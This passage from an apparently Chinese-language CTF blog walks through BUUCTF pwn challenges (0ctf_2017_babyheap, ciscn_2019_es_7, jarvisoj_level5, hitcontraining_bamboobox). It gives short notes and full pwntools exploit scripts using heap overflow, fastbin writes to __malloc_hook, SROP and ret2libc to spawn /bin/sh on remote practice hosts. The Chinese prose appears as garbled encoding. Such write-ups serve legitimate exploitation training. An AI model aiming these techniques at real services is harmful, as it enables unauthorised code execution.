class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;Content of heap :&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br><span class="hljs-comment">#-----------------------------------------</span><br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0x30</span>)+p64(free_got))<br>show(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Content : &#x27;</span>)<br>got=uu64(rc(<span class="hljs-number">6</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br><span class="hljs-comment">#debug()</span><br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#---------------------------------------</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="0ctf-2017-babyheap">0ctf_2017_babyheap</h3><p>è¿™é¢˜æ˜¯æˆ‘åšçš„ç¬¬ä¸€ä¸ªå †é¢˜ï¼Œbuué¢˜ç›®é‡å¤äº†</p><p>**å…³é”®è¯ï¼š**å †æº¢å‡º</p><p><strong>æ€è·¯ï¼š</strong></p><p>1.è¿ç”¨å †æº¢å‡ºï¼Œä¼ªé€ ä¸€ä¸ªåŒ…å«index1å’Œ2ï¼Œå¤§å°çš„åœ¨unsortbinå¤§å°èŒƒå›´çš„å—ï¼Œfreeåˆ°unsortbinï¼Œç„¶åç”³è¯·å…¶åŸæ¥index1å¤§å°çš„å—ï¼Œmain_arenaé™„è¿‘çš„åœ°å€å°±ä¼šä¸‹ç§»åˆ°index2çš„å—ï¼Œåœ°å€å°±èƒ½è¢«dumpå‡ºæ¥ã€‚æ³„éœ²äº†main_arenaé™„è¿‘çš„åœ°å€</p><p>2.ç®—å‡ºbase=æ³„éœ²addr-åç§»-ï¼ˆidaé‡ŒæŸ¥çœ‹malloc_trimå‡½æ•°v22å˜é‡çš„å€¼ï¼‰</p><p>ç®—å‡ºogï¼Œsystem</p><p>3.è¿ç”¨å †æº¢å‡ºï¼Œä¿®æ”¹freeåçš„fdï¼Œå†allocateä¸¤æ¬¡ï¼Œå°±èƒ½åˆ†é…é“æŒ‡å®šåœ°å€ï¼Œå› ä¸ºè¦é€šè¿‡æ£€æŸ¥ï¼Œæ‰€ä»¥åœ°å€ä¸ºï¼ˆmalloc_hook-0x23ï¼‰ï¼ˆåç§»å›ºå®šï¼‰</p><p>4.åœ¨malloc_hookçš„åœ°å€ä¸Šå¡«å…¥og</p><p>5.æ‰§è¡Œallocateï¼Œå°±ä¼šå¸¦åŠ¨shell</p><p>**æ³¨æ„ç‚¹ï¼š**æˆ‘è‡ªå·±é‡åšçš„æ—¶å€™æ¥æ”¶mallocåœ°å€å‡ºé”™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28122</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allocate</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index,size,content</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------------------------</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#1</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">1</span>)<br>allocate(<span class="hljs-number">0x60</span>)<br>dump(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>base=addr-<span class="hljs-number">88</span>-<span class="hljs-number">0x3C4B20</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>malloc_hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>og=base+o_g_old[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#-----------------------------------------------------------</span><br>free(<span class="hljs-number">1</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#1</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#4</span><br>fill(<span class="hljs-number">4</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(og))<br>allocate(<span class="hljs-number">0x1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-es-7">ciscn_2019_es_7</h3><p>**å…³é”®è¯ï¼š**SROP</p><p>é‡åˆ°æœ‰syscallï¼Œä¸”ä¸å¥½æ‰¾gadgetçš„æƒ…å†µï¼Œè€ƒè™‘SROP</p><p><strong>æ€è·¯ï¼š</strong></p><p>è¿™é¢˜æš—ç¤ºæ˜æ˜¾ï¼Œgadgeté‡Œé¢æœ‰0xfï¼Œå’Œ0x3bèµ‹å€¼ç»™raxï¼Œåˆ†åˆ«å¯¹åº”sigreturnï¼Œå’Œexecve</p><p><strong>å…·ä½“æ­¥éª¤ï¼š</strong></p><p>1.é writeæ³„éœ²æ ˆçš„åœ°å€ï¼Œgdbè°ƒè¯•å¾—åˆ°paddingä¸æ ˆçš„åœ°å€çš„åç§»</p><p>å¯ä»¥find â€˜/bin/shâ€™å°±èƒ½æ‰¾åˆ°ä½ç½®ä¹‹é—´çš„åç§»</p><p>2.ropè°ƒç”¨sigreturnï¼Œåå†å¡«ä¸ªsigframe</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25062</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#r=process(&#x27;./ciscn_2019_es_7&#x27;)</span><br>syscall_ret=<span class="hljs-number">0x400517</span><br>read=<span class="hljs-number">0x4004F1</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>mov_rax_sigreturn=<span class="hljs-number">0x4004DA</span><br>mov_rax_execve=<span class="hljs-number">0x4004E2</span><br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(read))<br>r.recv(<span class="hljs-number">0x20</span>)<br>stack_addr=u64(r.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack_addr)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.recv(<span class="hljs-number">8</span>)<br>sigframe=SigreturnFrame()<br>sigframe.rax=constants.SYS_execve<br>sigframe.rdi=stack_addr-<span class="hljs-number">0x118</span><br>sigframe.rsi=<span class="hljs-number">0x0</span><br>sigframe.rdx=<span class="hljs-number">0x0</span><br>sigframe.rsp=stack_addr<br>sigframe.rip=syscall_ret<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(mov_rax_sigreturn)+p64(syscall_ret)+<span class="hljs-built_in">str</span>(sigframe))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>è®°ä¸€ä¸‹ï¼Œè¦é‡åšä¸€ä¸‹<strong>ciscn_2019_s_3</strong></p><h3 id="jarvisoj-level5">jarvisoj_level5</h3><p>**å…³é”®è¯ï¼š**ROP</p><p><strong>æ€è·¯ï¼š</strong></p><p>1.ret2libcå³å¯</p><p><strong>æ³¨æ„ç‚¹ï¼š</strong></p><p>writeçš„ç¬¬ä¸‰ä¸ªå‚æ•°pop_rdxæ‰¾ä¸åˆ°ï¼Œæ‰€ä»¥æ–­ç‚¹è®¾åœ¨ç¬¬ä¸€æ¬¡sendå‰ï¼ŒæŸ¥çœ‹rdxå¯„å­˜å™¨çš„å€¼ï¼Œæˆ‘å‘ç°æ˜¯400ï¼Œå°±ä¸ç”¨ç®¡äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27831</span>)<br><span class="hljs-comment">#r=process(&#x27;./level3_x64&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./level3_x64&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>pop_rsi_r15=<span class="hljs-number">0x4006b1</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_r15)+p64(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(<span class="hljs-number">0</span>)+p64(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]))<br>got=u64(r.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>og=base+o_g_old[<span class="hljs-number">2</span>]<br>r.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(og))<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcontraining-bamboobox">hitcontraining_bamboobox</h3><p>**å…³é”®è¯ï¼š**å †æº¢å‡º</p><p>**æ€è·¯ï¼š**è¿™ç§é¢˜é™åˆ¶å°‘ï¼Œåˆ©ç”¨çš„å§¿åŠ¿å¾ˆå¤šï¼Œæˆ‘å·²ç»è§åˆ°3ç§äº†ï¼Œunlinkï¼ŒHouse of Forceï¼Œå’Œæˆ‘è¿™ç§æˆ‘ä¹Ÿä¸çŸ¥é“å«å•¥</p><p>è¿™é‡Œæˆ‘åˆ©ç”¨æ€è·¯å’Œä¸Šé¢0ctfå‡ ä¹ä¸€è‡´</p><p>å°±ä¸ç»†è®²äº†</p><p>**æ³¨æ„ç‚¹ï¼š**æˆ‘æœ¬æ¥reallocé‚£é‡Œå’Œogä½ç½®å¡«é”™äº†ï¼Œå¡äº†ä¸€ä¼šï¼Œ</p><p>åº”è¯¥å¡«çš„æ˜¯ ï¼Œ malloc_hookå‰ä¸€ä¸ªçš„reallocå¡«ogï¼Œè€ŒåŸæœ¬çš„malloc_hookä¸­å†™reallocä¸­pushçš„åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./bamboobox&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27318</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">length,name</span>):<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sa(<span class="hljs-string">&#x27;Please enter the name of item:&#x27;</span>,name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,length,name</span>):<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sa(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sla(<span class="hljs-string">&#x27;Please enter the new name of the item:&#x27;</span>,name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Please enter the index of item:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br><span class="hljs-comment">#-----------------------------------------------------------------</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x10</span>,<span 